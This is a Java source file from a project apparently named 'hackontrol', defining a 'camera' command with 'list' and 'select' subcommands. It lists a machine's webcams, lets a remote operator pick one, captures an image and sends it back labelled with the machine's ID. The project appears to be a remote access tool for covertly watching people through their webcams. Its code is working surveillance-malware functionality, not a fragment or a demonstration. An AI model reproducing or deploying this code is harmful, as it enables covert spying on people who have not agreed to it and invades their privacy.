package com.khopan.hackontrol.command;

import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;

import javax.imageio.ImageIO;

import com.khopan.camera.Camera;
import com.khopan.camera.CameraManager;
import com.khopan.hackontrol.source.CommandSource;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;

public class CameraCommand implements Command {
	private Camera[] cameraList;
	private Camera selectedCamera;

	@Override
	public void register(CommandDispatcher<CommandSource> dispatcher) {
		dispatcher.register(LiteralArgumentBuilder.<CommandSource>literal("camera").requires(source -> source.isSelected()).executes(context -> {
			CommandSource source = context.getSource();

			if(this.selectedCamera == null) {
				source.sendMessage("No camera was selected");
				return -1;
			}

			byte[] data = this.selectedCamera.capture();

			if(data == null || data.length == 0) {
				source.sendMessage("Error while capturing the image from the camera");
				return -1;
			}

			try {
				BufferedImage image = ImageIO.read(new ByteArrayInputStream(data));
				source.sendImage(image, '`' + this.selectedCamera.getName() + "` capture for `" + source.getMachineId() + '`');
			} catch(Throwable ignored) {
				source.sendMessage("Error while capturing the image from the camera");
				return -1;
			}

			return 1;
		}).then(LiteralArgumentBuilder.<CommandSource>literal("list").executes(context -> {
			CommandSource source = context.getSource();
			this.cameraList = CameraManager.getAllCameraDevices();
			String machineId = source.getMachineId();

			if(this.cameraList == null || this.cameraList.length == 0) {
				source.sendMessage("No camera devices are found for `" + machineId + '`');
				return -1;
			}

			StringBuilder builder = new StringBuilder();
			builder.append("Camera list for `");
			builder.append(machineId);
			builder.append("`:\n");

			for(int i = 0; i < this.cameraList.length; i++) {
				builder.append('`');
				builder.append(this.cameraList[i].getName());
				builder.append("` (Index: ");
				builder.append(i);
				builder.append(")\n");
			}

			this.selectedCamera = this.cameraList[0];
			source.sendMessage(builder.toString());
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("select").then(RequiredArgumentBuilder.<CommandSource, Integer>argument("index", IntegerArgumentType.integer(0)).executes(context -> {
			CommandSource source = context.getSource();

			if(this.cameraList == null || this.cameraList.length == 0) {
				source.sendMessage("Error: Camera list was empty");
				return -1;
			}

			int index = IntegerArgumentType.getInteger(context, "index");

			if(index > this.cameraList.length - 1) {
				source.sendMessage("Error: Camera index " + index + " out of bounds for length " + this.cameraList.length);
				return -1;
			}

			this.selectedCamera = this.cameraList[index];
			source.sendMessage('`' + this.selectedCamera.getName() + "` was selected for `" + source.getMachineId() + '`');
			return 1;
		}))));
	}
}
